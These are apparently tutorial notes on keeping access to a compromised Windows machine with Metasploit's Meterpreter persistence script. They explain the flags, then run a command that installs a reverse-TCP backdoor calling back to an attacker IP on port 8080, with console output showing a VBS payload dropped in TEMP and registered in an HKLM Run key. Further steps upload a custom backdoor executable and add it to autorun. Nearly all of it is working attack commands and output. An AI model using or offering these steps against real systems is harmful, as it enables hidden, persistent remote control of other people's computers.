run persistence -h

• -A starts the handler on our machine
• -X start the agent at boot
• Notice that -X requires SYSTEM privileges on the machine
• -i 5 connection attempt each 5 seconds
• -p 8080 the port for the connect back
• -r [IP_Address] our IP address

run persistence -A -X -i 5 -p 8080 -r 192.168.102.147

The steps in detail are as follows:
Creating Payload=windows/meterpreter/reverse_tcp
LHOST=192.168.102.147 LPORT=8080
Persistent Script written to C:\Windows\TEMP\flKiuvjYDY.vbs
Creating the payload:
Uploading the backdoor file:
Executing script C:\Windows\TEMP\flKiuvjYDY.vbs
Executing the backdoor:
Installing into autorun as
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\nZVDeQbFvEi

Check if it works
reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v nZVDeQbFvEi

exploit/multi/handler

Upload something
upload /root/my_bd.exe C:\\windows\Temp

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\my_bd.exe" -v bd_name
